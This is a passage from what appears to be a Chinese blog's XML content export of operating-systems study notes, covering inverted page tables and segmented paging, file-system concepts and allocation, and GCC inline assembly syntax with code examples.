<li>页帧数：4096=4K</li>
<li>页寄存器使用的空间：8*4096=32KB（假定每个页寄存器占8字节）</li>
<li>页寄存器带来的额外开销：32K/16M=0.2%（大约）</li>
<li>虚拟内存的大小：任意</li>
</ul>
<p><strong>页寄存器特征</strong></p>
<p>优点：</p>
<ul>
<li>页表大小相对于物理内存而言很小</li>
<li>页表大小与逻辑地址空间大小无关</li>
</ul>
<p>缺点：</p>
<ul>
<li>页表信息对调后，需要根据帧号可找页号</li>
<li> 在页寄存器中搜索逻辑地址中的页号</li>
</ul>
<p><strong>页寄存器中的地址转换</strong></p>
<p>以快表缓存页表项的页寄存器为例，</p>
<ol>
<li>对逻辑地址进行Hash变换 </li>
<li>在快表中查找对应页表项</li>
<li>有冲突时遍历冲突项列表</li>
<li>查找失败时，产生异常</li>
</ol>
<p><strong>快表的限制</strong></p>
<ul>
<li>快表的容量限制</li>
<li>快表的功耗限制（StrongARM上快表功耗占27%）</li>
</ul>
<h2 id="反置页表"><a href="#反置页表" class="headerlink" title="反置页表"></a>反置页表</h2><p><img src="https://i.loli.net/2019/07/27/5d3b98f267b5a68131.png"></p>
<p>查找过程：</p>
<ol>
<li>从逻辑地址中得到页号</li>
<li>根据页号的运行进程pid计算hash值</li>
<li>在反置页表中查找对应页表项，从中找到相应的物理帧号</li>
</ol>
<blockquote>
<p>可有效应对大地址空间可采用的页表手段是() </p>
</blockquote>
<ul>
<li><input checked="" disabled="" type="checkbox"> 多级页表</li>
<li><input checked="" disabled="" type="checkbox"> 反置页表</li>
<li><input disabled="" type="checkbox"> 页寄存器</li>
<li><input disabled="" type="checkbox"> 单级页表</li>
</ul>
<p>页寄存器和反置页表很像，但它们的一个区别是进程ID在地址转换中的使用。没有进程ID（页寄存器方案）时，页表占用的空间仍然是与进程数相关的。反置页表的大小只与物理内存大小，与并发进程数无关。</p>
<p>采用页寄存器的硬件开销会很大。所以现在的通用CPU（包括64位的CPU）没有采用这种方式，大部分还是多级页表。由于有TLB作为缓存，效率还不错。</p>
<h1 id="段页式存储管理"><a href="#段页式存储管理" class="headerlink" title="段页式存储管理"></a>段页式存储管理</h1><p>段式内存便于内存保护，页式存储便于内存利用和优化转移，因此引入段页式存储管理。</p>
<p><img src="https://i.loli.net/2019/07/27/5d3b992475fc583205.png"></p>
<p>逻辑地址：段号+页号+页内偏移</p>
<p>物理地址：帧号+页内偏移</p>
<p><strong>地址转换过程</strong></p>
<ol>
<li>从逻辑地址中的得到段号s和页号P,偏移o</li>
<li>根据段基址和段号S查找对应段表项</li>
<li>访问段S的页表，取出对应的帧号</li>
</ol>
<p><strong>段页式存储管理中的内存共享</strong></p>
<p>通过指向相同的页表基址，实现进程间的段共享。</p>
<p>在启动页机制后，不可能进行的操作包括（）</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 取消段机制，只保留页机制</li>
<li><input disabled="" type="checkbox"> 取消页机制，只保留段机制</li>
<li><input disabled="" type="checkbox"> 取消页机制，也取消段机制</li>
<li><input disabled="" type="checkbox"> 保留页机制，也保留段机制</li>
</ul>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>文件系统</title>
    <url>/systems/file-system/</url>
    <content><![CDATA[<p>文件系统是操作系统中管理持久性数据的子系统，提供数据存储和访问功能，可以提供组织、检索、读写访问数据功能。在没有文件系统时，我们在计算机上操作的数据无法有效保存，在计算机关机再重启时数据就丢失了。大多数计算机系统都有文件系统，我们常用的谷歌也是一个文件系统，支持分布式应用的数据管理，可以支持系统监控、故障检测、故障容忍和自动恢复，提供很高的可靠性。</p>
<a id="more"></a>

<h1 id="文件系统的概念"><a href="#文件系统的概念" class="headerlink" title="文件系统的概念"></a>文件系统的概念</h1><p>文件系统的主要目的是实现对文件的按名存取(从用户的角度来看)，而文件管理实际上是对辅助存储空间的管理。</p>
<p>文件是具有符号名，由字节序列构成的数据项集合。</p>
<ul>
<li>文件是文件系统的基本数据单位</li>
<li>文件名是文件的标识符号</li>
</ul>
<h2 id="文件系统的功能"><a href="#文件系统的功能" class="headerlink" title="文件系统的功能"></a>文件系统的功能</h2><p>分配文件磁盘空间</p>
<ul>
<li>管理文件块(位置和顺序)</li>
<li>管理空闲空间(位置)</li>
<li>分配算法(策略)</li>
</ul>
<p>管理文件集合</p>
<ul>
<li><strong>定位</strong> 文件及其内容</li>
<li><strong>命名</strong> 通过名字找到文件</li>
<li><strong>文件系统结构</strong> 文件组织方式</li>
</ul>
<p>确保数据可靠和安全</p>
<ul>
<li><strong>安全</strong> 多层次保护数据安全</li>
<li><strong>可靠</strong> 持久保存文件，避免系统崩溃、攻击</li>
</ul>
<h2 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h2><p>名称、类型、位置、大小、保护、创建者、创建时间、最近修改时间等</p>
<p>文件都有文件名与数据，这在 Linux 上被分成两个部分：用户数据 (user data) 与元数据 (metadata)。用户数据，即文件数据块 (data block)，数据块是记录文件真实内容的地方；而元数据则是文件的附加属性，如文件大小、创建时间、所有者等信息。在 Linux 中，元数据中的 inode 号（inode 是文件元数据的一部分但其并不包含文件名，inode 号即索引节点号）才是文件的唯一标识而非文件名。文件名仅是为了方便人们的记忆和使用，系统或程序通过 inode 号寻找正确的文件数据块。</p>
<p><strong>文件头</strong> 文件系统元数据中的文件信息</p>
<ul>
<li>文件属性</li>
<li>文件存储位置和顺序</li>
</ul>
<h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h2><p>进程访问文件数据前必须先打开文件，内核跟踪所有打开的文件。</p>
<p>操作系统在打开文件表中维护的打开文件状态和信息。文件描述符是打开文件的标识，由于打开文件表中文件数目和文件系统中文件有数量级差别，所以另外维护文件描述符而不是直接引用文件标识。</p>
<p><strong>文件指针</strong></p>
<ul>
<li>最近一次读写位置</li>
<li>每个进程分别维护自己的打开文件指针</li>
</ul>
<p><strong>文件打开计数</strong></p>
<ul>
<li>当前打开文件的次数</li>
<li>最后一个进程关闭文件时，将其从打开文件表中移除</li>
</ul>
<p><strong>文件的磁盘位置</strong></p>
<ul>
<li><p>缓存数据访问信息</p>
</li>
<li><p>访问权限</p>
<ul>
<li>每个进程的文件访问模式信息(以什么方式访问)</li>
</ul>
</li>
</ul>
<h2 id="文件的用户视图和系统视图"><a href="#文件的用户视图和系统视图" class="headerlink" title="文件的用户视图和系统视图"></a>文件的用户视图和系统视图</h2><ul>
<li>文件的用户视图<ul>
<li>持久的数据结构</li>
</ul>
</li>
<li>系统访问接口<ul>
<li>字节序列的集合(Unix)</li>
<li>系统不关心存储在磁盘上的数据结构</li>
</ul>
</li>
<li>操作系统的文件视图<ul>
<li>数据块的集合</li>
<li>数据块是逻辑存储单元，而扇区是物理存储单元</li>
<li>块大小和扇区大小通常是不同的，通常是几个扇区构成一个数据块</li>
</ul>
</li>
</ul>
<p><strong>用户视图到系统视图的转换</strong></p>
<p>文件系统中最小基本单位为数据块，磁盘最小访问单位为扇区。</p>
<ul>
<li>进程读文件<ul>
<li>获取字节所在的数据块(数据块是逻辑存储单位)</li>
<li>返回数据块内对应部分</li>
</ul>
</li>
<li>进程写文件<ul>
<li>获取数据块</li>
<li>修改数据块中对应部分</li>
<li>写回数据块</li>
</ul>
</li>
</ul>
<h2 id="访问模式"><a href="#访问模式" class="headerlink" title="访问模式"></a>访问模式</h2><blockquote>
<p>进程如何访问文件</p>
</blockquote>
<p>顺序访问</p>
<ul>
<li>按字节依次读取</li>
<li>大多数文件访问都是顺序访问</li>
</ul>
<p>随机访问</p>
<ul>
<li>从中间读写</li>
<li>不常用，但很重要</li>
<li>虚拟内存中把内存页存储在文件</li>
</ul>
<p>索引访问</p>
<ul>
<li>依据数据特征索引</li>
<li>通常操作系统不完整提供索引访问</li>
<li>数据库是建立在索引内容的磁盘访问之上</li>
</ul>
<h2 id="文件内部结构"><a href="#文件内部结构" class="headerlink" title="文件内部结构"></a>文件内部结构</h2><ul>
<li>无结构<ul>
<li>单词、字节序列</li>
</ul>
</li>
<li>简单记录结构<ul>
<li>分列</li>
<li>固定长度</li>
<li>可变长度</li>
</ul>
</li>
<li>复杂结构<ul>
<li>格式化的文档(PDF Word)，应用程序可根据文档格式对文件进行识别</li>
<li>可执行文件</li>
</ul>
</li>
</ul>
<h2 id="文件共享和访问控制"><a href="#文件共享和访问控制" class="headerlink" title="文件共享和访问控制"></a>文件共享和访问控制</h2><p>多用户系统中的文件共享是很有必要的</p>
<ul>
<li>访问控制<ul>
<li>每个用户能够获得哪些文件的哪些访问权限</li>
<li>访问模式：读、写、执行、删除、列表</li>
</ul>
</li>
<li>文件访问控制列表(ACL)<ul>
<li>&lt;文件实体, 权限&gt;</li>
</ul>
</li>
<li>Unix模式<ul>
<li>&lt;用户|组|所有人, 读|写|可执行&gt;</li>
<li><strong>用户标识ID</strong> 识别用户，表明每个用户所允许的权限及保护模式</li>
<li><strong>组标识ID</strong> 允许用户组成组，并指定了组访问权限</li>
</ul>
</li>
</ul>
<p><strong>语义一致性</strong></p>
<p>规定多进程如何同时访问共享文件</p>
<ul>
<li>与同步算法相似</li>
<li>因磁盘I/O和网络延迟而设计简单</li>
</ul>
<p><strong>Unix文件系统(UFS)语义</strong></p>
<ul>
<li>对打开文件的写入内容立即对其他打开同一文件的其他用户可见</li>
<li>共享文件指针允许多用户同时读取和写入文件</li>
</ul>
<p><strong>会话语义</strong></p>
<ul>
<li>写入内容只有当文件关闭时可见( 效率低)</li>
</ul>
<p><strong>读写锁</strong></p>
<ul>
<li>一些操作系统和文件系统提供该功能</li>
</ul>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p><strong>分层文件系统</strong></p>
<p><img src="https://i.loli.net/2019/07/29/5d3ea0f50b2a777128.png"></p>
<p><strong>目录操作</strong></p>
<p>操作系统应该只允许内核修改目录，以确保映射的完整性。应用程序通过系统调用访问目录。</p>
<ul>
<li>搜索文件</li>
<li>创建文件</li>
<li>删除文件</li>
<li>列目录</li>
<li>重命名文件</li>
<li>遍历路径</li>
</ul>
<p><strong>目录实现</strong></p>
<p><strong>文件名的线性列表</strong> 包含了指向数据块的指针</p>
<ul>
<li>编程简单</li>
<li>执行搜索耗时</li>
</ul>
<p><strong>哈希表</strong></p>
<ul>
<li>减少目录搜索时间</li>
<li>冲突 两个文件名的哈希值相同</li>
<li>固定大小</li>
</ul>
<p><strong>文件别名</strong></p>
<p><img src="https://i.loli.net/2019/07/29/5d3ea1e9b811a11408.png"></p>
<p>硬链接中文件的删除操作在删除最后一个文件项时才删除。</p>
<p><strong>名字解析(路径遍历)</strong></p>
<p>名字解析是指将逻辑名字转换成物理资源(文件)</p>
<p>有以下两种名字解析的方式</p>
<ul>
<li>遍历文件目录直到找到目标文件</li>
<li>根据路径名在文件系统中找到实际文件位置</li>
</ul>
<p>比如：当解析 <code>&quot;/bin/ls&quot;</code>时</p>
<ul>
<li>读取根目录的文件头(在磁盘固定位置)</li>
<li>读取根目录的数据块，搜索 bin 项</li>
<li>读取 bin 的文件头</li>
<li>读取 bin的数据块，搜索 ls项</li>
<li>读取 ls 的文件头</li>
</ul>
<p><strong>当前工作目录(PWD)</strong></p>
<ul>
<li>每个进程都会指向一个文件目录用于解析文件名(可以提高效率)</li>
<li>允许用户指定相对路径来代替绝对路径 如 <code>PWD=&quot;/bin”</code> 能够解析 <code>“ls”</code></li>
</ul>
<p><strong>文件系统挂载</strong></p>
<p><img src="https://i.loli.net/2019/07/29/5d3ea3a2ec9d698391.png"></p>
<h2 id="文件系统种类"><a href="#文件系统种类" class="headerlink" title="文件系统种类"></a>文件系统种类</h2><ul>
<li>磁盘文件系统<ul>
<li>文件存储在数据存储设备上 如磁盘</li>
<li>FAT，NTFS，ext2/3， ISO9660</li>
</ul>
</li>
<li>数据库文件系统<ul>
<li>文件特征是可被寻址辨识的</li>
<li>WinFS</li>
</ul>
</li>
<li>日志文件系统<ul>
<li>记录文件系统的修改/事件</li>
<li>以原子形式记录访问</li>
</ul>
</li>
<li>网络/分布式文件系统(通过网络访问)<ul>
<li>NFS、SMB、AFS、GFS</li>
</ul>
</li>
<li>特殊/虚拟文件系统<ul>
<li>管道</li>
</ul>
</li>
</ul>
<p><strong>网络/分布式文件系统</strong></p>
<p>文件可以通过网络被共享</p>
<ul>
<li>文件处于远程服务器</li>
<li>客户端远程挂载服务器文件系统</li>
<li>标准系统文件访问被转换成远程访问</li>
<li>标准文件共享协议<ul>
<li>NFS for Unix</li>
<li>CIFS for Windows</li>
</ul>
</li>
</ul>
<p>分布式文件系统的挑战</p>
<ul>
<li>客户端和客户端上的用户辨别起来很复杂</li>
<li>NFS 不安全</li>
<li>一致性问题</li>
<li>错误处理</li>
</ul>
<h1 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h1><h2 id="文件系统的实现"><a href="#文件系统的实现" class="headerlink" title="文件系统的实现"></a>文件系统的实现</h2><p><img src="https://i.loli.net/2019/07/29/5d3ea871d8a0c63026.png"></p>
<p><strong>目的</strong></p>
<ul>
<li>对所有不同文件系统的抽象，多种文件系统，对上提供一致的访问接口</li>
</ul>
<p><strong>功能</strong></p>
<ul>
<li>提供相同的文件和文件系统接口</li>
<li>管理所有文件和文件系统关联的数据结构</li>
<li>高效查询例程，遍历文件系统</li>
<li>与特定文件系统模块的交互</li>
</ul>
<h2 id="文件系统基本数据结构"><a href="#文件系统基本数据结构" class="headerlink" title="文件系统基本数据结构"></a>文件系统基本数据结构</h2><ul>
<li>文件卷控制块(Unix superblock)<ul>
<li>每个文件系统一个</li>
<li>文件系统详细信息</li>
<li>块、块大小、空余块、计数/指针</li>
</ul>
</li>
<li>文件控制块(Unix vnode or inode)<ul>
<li>每个文件一个</li>
<li>文件详细信息</li>
<li>访问权限、拥有者、大小、数据块位置</li>
</ul>
</li>
<li>目录项(Linux dentry)<ul>
<li>每个目录项一个(目录和文件)</li>
<li>将目录项数据结构及树型布局编码成树型数据结构</li>
<li>指向文件控制块、父目录、子目录 </li>
</ul>
</li>
</ul>
<p><strong>文件系统的组织视图</strong></p>
<p><img src="https://i.loli.net/2019/07/29/5d3eaae144ce836581.png"></p>
<h2 id="文件系统的存储结构"><a href="#文件系统的存储结构" class="headerlink" title="文件系统的存储结构"></a>文件系统的存储结构</h2><ul>
<li>文件系统数据结构<ul>
<li>卷控制块(superblock 每个文件系统一个)</li>
<li>文件控制块(inode 每个文件一个)</li>
<li>目录节点(dentry 每个目录项一个)</li>
</ul>
</li>
<li>以上都持久存储在外存中<ul>
<li>存储设备的数据块中</li>
</ul>
</li>
<li>当需要时加载进内存<ul>
<li><strong>卷控制模块</strong> 当文件系统挂载时进入内存</li>
<li><strong>文件控制块</strong> 当文件被访问时候进入内存</li>
<li><strong>目录节点</strong> 在遍历一个文件路径时进入内存</li>
</ul>
</li>
</ul>
<p><strong>文件系统的存储视图</strong></p>
<p><img src="https://i.loli.net/2019/07/29/5d3eac157bb2220832.png"></p>
<h2 id="文件缓存"><a href="#文件缓存" class="headerlink" title="文件缓存"></a>文件缓存</h2><p><strong>多种磁盘缓存位置</strong></p>
<p><img src="https://i.loli.net/2019/07/29/5d3ead294484d35296.png"></p>
<p>文件缓存有数据块缓存和页缓存两种方式。</p>
<p><strong>数据块缓存</strong></p>
<ul>
<li>数据块按需进入内存<ul>
<li>提供read()操作</li>
<li>预读 预先读取后面的数据块</li>
</ul>
</li>
<li>数据块使用后被缓存<ul>
<li>假设数据将会再次用到</li>
<li>写操作可能被缓存和延迟写入</li>
</ul>
</li>
</ul>
<p><img src="https://i.loli.net/2019/07/29/5d3eaeefd292d70351.png"></p>
<p><strong>页缓存</strong></p>
<ul>
<li>虚拟页式存储<ul>
<li>在虚拟地址空间中虚拟页面可映射到本地外存文件中</li>
</ul>
</li>
<li>文件数据块的页缓存<ul>
<li>在虚拟内存中文件数据块被映射成页</li>
<li>文件的读/写操作被转换成对内存的访问</li>
<li>可能导致缺页或被设置为脏页</li>
<li>会带来问题 页面置换算法需要协调虚拟存储和页缓存间的页面数</li>
</ul>
</li>
</ul>
<p><img src="https://i.loli.net/2019/07/29/5d3eb060b67c162692.png"></p>
<p><img src="https://i.loli.net/2019/07/29/5d3eaffdb7b9573496.png"></p>
<p><strong>文件系统中打开文件的数据结构</strong></p>
<ul>
<li>文件描述符<ul>
<li>每个被打开的文件都有一个文件描述符</li>
<li><strong>文件状态信息</strong> 目录项、当前文件指针、文件操作设置</li>
</ul>
</li>
<li>打开文件表<ul>
<li>每个进程都有一个打开文件表</li>
<li>一个系统级的打开文件表</li>
<li>有文件被打开， 文件卷就不能被卸载</li>
</ul>
</li>
</ul>
<p><img src="https://i.loli.net/2019/07/29/5d3eb14c370e462446.png"></p>
<p><strong>打开文件锁</strong></p>
<p>一些文件系统提供文件锁 用于协调多进程的文件访问</p>
<ul>
<li><strong>强制</strong> 根据锁保持情况和访问需求确定是否拒绝访问</li>
<li><strong>劝告</strong> 进程可以查找锁的状态来决定怎么做</li>
</ul>
<h1 id="文件分配"><a href="#文件分配" class="headerlink" title="文件分配"></a>文件分配</h1><p><strong>文件大小</strong></p>
<ul>
<li>大多数文件都很小<ul>
<li>需要对小文件提供很好的支持</li>
<li>数据块空间不能太大</li>
</ul>
</li>
<li>一些文件非常大<ul>
<li>必须支持大文件(64位文件偏移)</li>
<li>大文件访问需要高效</li>
</ul>
</li>
</ul>
<p><strong>分配方式</strong></p>
<ul>
<li>连续分配</li>
<li>链式分配</li>
<li>索引分配</li>
</ul>
<p><strong>指标</strong></p>
<ul>
<li><strong>存储效率</strong> 外部碎片(连续分配)，忽略内碎片</li>
<li><strong>读写性能</strong> 访问速度</li>
</ul>
<h2 id="连续分配"><a href="#连续分配" class="headerlink" title="连续分配"></a>连续分配</h2><p><img src="https://i.loli.net/2019/07/29/5d3eb46c39ef341976.png"></p>
<h2 id="链式分配"><a href="#链式分配" class="headerlink" title="链式分配"></a>链式分配</h2><p><img src="https://i.loli.net/2019/07/29/5d3eb4c0bc2a960007.png"></p>
<h2 id="索引分配"><a href="#索引分配" class="headerlink" title="索引分配"></a>索引分配</h2><p><img src="https://i.loli.net/2019/07/29/5d3eb51dc2e0023514.png"></p>
<p><strong>大文件的索引分配</strong></p>
<p><img src="https://i.loli.net/2019/07/29/5d3eb553c151d45985.png"></p>
<h2 id="UFS多级索引分配"><a href="#UFS多级索引分配" class="headerlink" title="UFS多级索引分配"></a>UFS多级索引分配</h2><p><img src="https://i.loli.net/2019/07/29/5d3eb59b1d34217710.png"></p>
<p>(UFS Unix File System)</p>
<ul>
<li>文件头包含13个指针<ul>
<li>10个指针指向数据块</li>
<li>第1个指针指向索引块</li>
<li>第12个指针指向二级索引块</li>
<li>第13个指针指向三级索引块</li>
</ul>
</li>
<li>效果<ul>
<li>提高了文件大小限制阈值</li>
<li>动态分配数据块 文件扩展很容易</li>
<li>小文件开销小</li>
<li>只为大文件分配间接索引块 大文件在访问数据块时需要大量查询</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>Operating Systems</tag>
      </tags>
  </entry>
  <entry>
    <title>GCC内联汇编</title>
    <url>/systems/inlineassembly/</url>
    <content><![CDATA[<p>常规的函数调用在调用时会有压栈的行为。假如我们想引导编译器将一段函数代码插入到调用者调用的位置处执行，而不是以默认压栈调用的方式，常规函数调用就无法满足我们的需求了，于是引入了内联函数。内联函数减少了函数的调用开销：如果多次被调用的某个函数实参相同，则其返回值必然是相同的，编译器可利用此特性对程序进行优化，而内联汇编相当于用汇编语句写成的内联函数，具有方便、快速的特点，在系统编程中广泛使用。</p>
<a id="more"></a>

<h2 id="GCC内联汇编格式"><a href="#GCC内联汇编格式" class="headerlink" title="GCC内联汇编格式"></a>GCC内联汇编格式</h2><p>GCC (GNU Compiler for Linux) 使用AT&amp;T/UNIX汇编语法，与Intel格式的汇编有一些不同，差别如下所示：<br>1.源/目的操作数顺序<br>AT&amp;T和Intel汇编语法源操作数和目的操作数的方向正好相反。Intel中第一个操作数作为目的操作数，第二个操作数作为源操作数。而在AT&amp;T中，第一个操作数是源操作数，第二个是目的操作数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AT&amp;T: movl %eax, %ebx           Intel: mov ebx, eax</span><br></pre></td></tr></table></figure>
<p>2.寄存器命名</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AT&amp;T: %eax                      Intel: eax</span><br></pre></td></tr></table></figure>
<p>3.常数、立即数的格式<br>在AT&amp;T语法中，立即数都有’$’前缀。引用的C语言静态变量也必须放上’$’前缀；除此之外，在Intel语法中, 16进制的常数是以’h’作为后缀的，但是在AT&amp;T语法中, 是以’0x’作为前缀的。因此，在AT&amp;T语法中，一个16进制常数的写法是：首先以$开头，紧跟着是0x，最后是常数本身。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AT&amp;T: movl $_value, %ebx        Intel: mov eax, _value</span><br></pre></td></tr></table></figure>
<p>4.寻址方式 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AT&amp;T:   immed32(basepointer, indexpointer, indexscale)</span><br><span class="line">Intel:  [basepointer + indexpointer × indexscale + imm32)</span><br></pre></td></tr></table></figure>
<p>5.操作数长度标识</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AT&amp;T: movw %ax, %bx             Intel: mov bx, ax</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="left">Intel Code</th>
<th><strong>AT&amp;T Code</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">mov eax,1</td>
<td>movl $1,%eax</td>
</tr>
<tr>
<td align="left">mov ebx,0ffh</td>
<td>movl $0xff,%ebx</td>
</tr>
<tr>
<td align="left">int 80h</td>
<td>int $0x80</td>
</tr>
<tr>
<td align="left">mov ebx, eax</td>
<td>movl %eax, %ebx</td>
</tr>
<tr>
<td align="left">mov eax,[ecx]</td>
<td>movl (%ecx),%eax</td>
</tr>
<tr>
<td align="left">mov eax,[ebx+3]</td>
<td>movl 3(%ebx),%eax</td>
</tr>
<tr>
<td align="left">mov eax,[ebx+20h]</td>
<td>movl 0x20(%ebx),%eax</td>
</tr>
<tr>
<td align="left">add eax,[ebx+ecx*2h]</td>
<td>addl (%ebx,%ecx,0x2),%eax</td>
</tr>
<tr>
<td align="left">lea eax,[ebx+ecx]</td>
<td>leal (%ebx,%ecx),%eax</td>
</tr>
<tr>
<td align="left">sub eax,[ebx+ecx*4h-20h]</td>
<td>subl -0x20(%ebx,%ecx,0x4),%eax</td>
</tr>
</tbody></table>
<h2 id="基本内联汇编"><a href="#基本内联汇编" class="headerlink" title="基本内联汇编"></a>基本内联汇编</h2><p>基本内联汇编如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;statements&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span>(<span class="string">&quot;movl %ecx, %eax&quot;</span>); <span class="comment">//把ecx内容移动到eax</span></span><br><span class="line"> __asm__(<span class="string">&quot;movb %bh , (%eax)&quot;</span>); <span class="comment">//把bh中一个字节的内容移动到eax指向的内存</span></span><br></pre></td></tr></table></figure>
<p>其中”asm” 和 “<strong>asm</strong>“ 的含义是完全一样的。如果内联汇编有多条指令，那么每行要加上 “\n\t”，让 gcc 把内联汇编代码转换为一般的汇编代码时能够保证换行和留有一定的空格。<br>例如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__asm__ ( <span class="string">&quot;movl %eax, %ebx\n\t&quot;</span></span><br><span class="line">                <span class="string">&quot;movl $56, %esi\n\t&quot;</span></span><br><span class="line">                <span class="string">&quot;movl %ecx, $label(%edx,%ebx,$4)\n\t&quot;</span></span><br><span class="line">                <span class="string">&quot;movb %ah, (%ebx)&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="扩展内联汇编"><a href="#扩展内联汇编" class="headerlink" title="扩展内联汇编"></a>扩展内联汇编</h2><p>当寄存器的值发生改变而GCC仍然认为寄存器的值不变时，基本内联汇编在程序优化会出现问题，所以引入扩展内联汇编来解决这一问题。<br>扩展内联汇编格式如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( assembler <span class="keyword">template</span></span><br><span class="line">        : output operands               <span class="comment">/* optional */</span></span><br><span class="line">        : input operands                <span class="comment">/* optional */</span></span><br><span class="line">        : <span class="built_in">list</span> of clobbered registers   <span class="comment">/* optional */</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>其中assembler template为汇编指令部分。括号内的操作数都是C语言表达式中常量字符串。不同部分之间使用冒号分隔。相同部分语句中的每个小部分用逗号分隔。最多可以指定10个操作数。<br>例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( <span class="string">&quot;cld\n\t&quot;</span></span><br><span class="line">          <span class="string">&quot;rep\n\t&quot;</span></span><br><span class="line">          <span class="string">&quot;stosl&quot;</span></span><br><span class="line">         : <span class="comment">/* no output registers */</span></span><br><span class="line">         : <span class="string">&quot;c&quot;</span> (count), <span class="string">&quot;a&quot;</span> (fill_value), <span class="string">&quot;D&quot;</span> (dest)</span><br><span class="line">         : <span class="string">&quot;%ecx&quot;</span>, <span class="string">&quot;%edi&quot;</span></span><br><span class="line">      );</span><br></pre></td></tr></table></figure>
<p>以上循环count次将fill_value的值到填充到edi寄存器指定的内存位置。并且告诉GCC，寄存器ecx和edi中的内容可能已经被改变了。<br>再例如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">10</span>, b;</span><br><span class="line"><span class="keyword">asm</span> ( <span class="string">&quot;movl %1, %%eax;</span></span><br><span class="line"><span class="string">           movl %%eax, %0;&quot;</span></span><br><span class="line">          :<span class="string">&quot;=r&quot;</span>(b)        <span class="comment">/* output */</span></span><br><span class="line">          :<span class="string">&quot;r&quot;</span>(a)         <span class="comment">/* input */</span></span><br><span class="line">          :<span class="string">&quot;%eax&quot;</span>         <span class="comment">/* clobbered register */</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>以上将a赋值给b,其中：</p>
<ul>
<li>“b”是输出操作数，用%0来访问，”a”是输入操作数，用%1来访问。</li>
<li>“r” 是一个constraint,让GCC自由选择一个寄存器来存储变量a。</li>
</ul>
<h3 id="汇编模板"><a href="#汇编模板" class="headerlink" title="汇编模板"></a>汇编模板</h3><p>汇编模板部分就是嵌入在C程序中的汇编指令，格式如下：</p>
<ul>
<li>每条指令放在一个双引号内，或者将所有的指令都放着一个双引号内。</li>
<li>每条指令都要包含一个分隔符。合法的分隔符是换行符(\n)或者分号。用换行符的时候通常后面放一个制表符\t。</li>
<li>访问C语言变量用%0,%1…等等。</li>
</ul>
<h3 id="操作数"><a href="#操作数" class="headerlink" title="操作数"></a>操作数</h3><p>”asm”内部使用C语言字符串作为操作数，操作数都要放在双引号中。constraint和修饰都放在双引号内。如下所示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;constraint&quot;</span> (C expression) <span class="comment">//&quot;=r&quot;(result)</span></span><br></pre></td></tr></table></figure>
<p>对于输出操作数一定要用 “=“修饰。 constraint主要用来指定操作数的寻址类型 (内存寻址或寄存器寻址)，也用来指明使用哪个寄存器，多个操作数间用逗号分隔。<br>例如</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span> ( <span class="string">&quot;leal (%1,%1,4), %0&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span> (five_times_x)</span><br><span class="line">        : <span class="string">&quot;r&quot;</span> (x)</span><br><span class="line">     );</span><br></pre></td></tr></table></figure>
<p>这里输入操作数是 ‘x’，在没有指定具体寄存器的情况下，GCC会自己选择合适的输入输出寄存器。我们也可以修改constraint部分内容，让GCC固定使用同一个寄存器，具体方法如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span>( <span class="string">&quot;lea (%0,%0,4),%0&quot;</span></span><br><span class="line">        : <span class="string">&quot;=r&quot;</span> (five_times_x)</span><br><span class="line">        : <span class="string">&quot;0&quot;</span> (x)</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
<h3 id="Clobber-List"><a href="#Clobber-List" class="headerlink" title="Clobber List"></a>Clobber List</h3><p>如果某个指令改变了某个寄存器的值，我们就必须在asm中第三个冒号后的Clobber List中标示出该寄存器来通知GCC，让其不再假定之前存入这些寄存器中的值依然合法。输入输出寄存器不用放Clobber List中，因为GCC明确了asm将使用这些寄存器。其他寄存器无论是显示还是隐式地使用，必须在clobbered list中标明。<br>如果指令中以无法预料的形式修改了内存值，需要在clobbered list中加上”memory”。从而使得GCC不覆盖该位置的值。此外，如果要改变没有被列在输入和出部分的内存内容时，需要加上volatile关键字说明。clobbered list中列出的寄存器可以被多次读写。<br>以下给出内联汇编实现乘法的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span>( <span class="string">&quot;movl %0,%%eax;</span></span><br><span class="line"><span class="string">          movl %1,%%ecx;</span></span><br><span class="line"><span class="string">          call _foo&quot;</span></span><br><span class="line">        : <span class="comment">/*no outputs*/</span></span><br><span class="line">        : <span class="string">&quot;g&quot;</span> (from), <span class="string">&quot;g&quot;</span> (to)</span><br><span class="line">        : <span class="string">&quot;eax&quot;</span>, <span class="string">&quot;ecx&quot;</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
